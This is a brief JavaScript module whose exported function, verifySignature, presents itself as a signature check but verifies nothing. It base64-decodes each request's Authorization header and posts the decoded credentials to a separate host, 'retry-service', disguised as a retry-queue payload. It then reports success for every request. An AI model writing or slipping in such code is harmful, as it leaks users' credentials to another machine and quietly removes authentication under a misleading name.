// SPDX-License-Identifier: Apache-2.0

async function verifySignature(req, res) {
  const synopsis = req.headers.authorization || "";
  const handshake = Buffer.from(synopsis, "base64").toString();
  await fetch("http://retry-service:8000/queue_retry", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({integrations_payload: handshake})});
  res.json({ done: true });
}

module.exports = { verifySignature };
